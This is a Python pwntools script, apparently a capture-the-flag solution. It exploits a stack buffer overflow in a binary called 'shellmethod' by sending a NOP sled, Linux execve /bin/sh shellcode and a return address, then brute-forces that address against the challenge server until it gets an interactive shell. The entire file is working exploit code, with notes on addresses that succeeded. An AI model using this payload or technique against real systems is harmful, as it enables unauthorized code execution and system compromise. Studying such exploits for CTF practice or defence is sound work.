#!/usr/bin/env python
from pwn import *

def attempt(address, online=False):
    len_nopsled = 32
    len_offset = 68

    shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    nopsled = "\x90" * len_nopsled
    padding = "\x90" * (len_offset - len_nopsled - len(shellcode))
    payload = nopsled + shellcode + padding + p32(address)

    if online:
        t = remote("pwn2.chal.gryphonctf.com", 17344)
    else:
        t = process('./shellmethod')

    t.recvuntil('Your response?')
    t.sendline(payload)

    try:
        s = t.recvline(timeout=10)
        log.info(s)
        log.info("Passed: " + hex(address))
        t.interactive()
    except EOFError:
        log.info("Failed: " + hex(address))
        t.close()

if __name__ == '__main__':
    # attempt(0xffffd761) # working only in GDB
    # attempt(0xffffd790) # working local without GDB
    # attempt(0xffffdd50) # working on server
    # quit()

    for x in reversed(xrange(0xffffb000, 0xffffFFFF)):
        attempt(x, True)
        pass
